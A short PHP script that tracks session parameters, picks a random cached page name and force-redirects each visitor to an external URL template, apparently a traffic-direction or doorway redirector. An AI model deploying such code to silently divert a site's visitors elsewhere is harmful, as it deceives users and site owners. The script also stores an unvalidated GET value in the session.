<?php
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Expires: " . date("r"));

$_SESSION['tracked'] = true;
$t_params = ''; 

if(isset($_SESSION['c_trk']['uid']) && count($_SESSION['c_trk']) > 1){
  $t_params = [];
  foreach($_SESSION['c_trk'] as $sN=>$sV){
    if($sN == 'uid'){ continue; }
    if(empty($sV)){ $sV = 'NAN';}
    $t_params[] = $sN.'='.$sV;
  } $t_params = '?'.implode('&', $t_params);
}$_SESSION['c_trk'] = [];

$REDIR_URL = _PROTO_ . _URL_;
if(_RNREDIR_){
  $homeDat = file(_CACHE_ . 'home.dat');
  $homeDat = array_map('cleanStr', $homeDat);
  $homeDat = cleanArray($homeDat);
  $REDIR_URL = $REDIR_URL . $homeDat[array_rand($homeDat)] . _EXT_;
}

//Временное явление
if(isset($_GET[_RMARK_]) && !empty($_GET[_RMARK_])){
  $_SESSION['sub_iddqd'] = $_GET[_RMARK_];
}


$ext_url = str_replace('##C_PAGE##', urlencode($REDIR_URL), _R_URL_);
header("Location: $ext_url" );
exit;

$_SESSION['n_url'] = $REDIR_URL;
header("Location: " . $REDIR_URL . $t_params);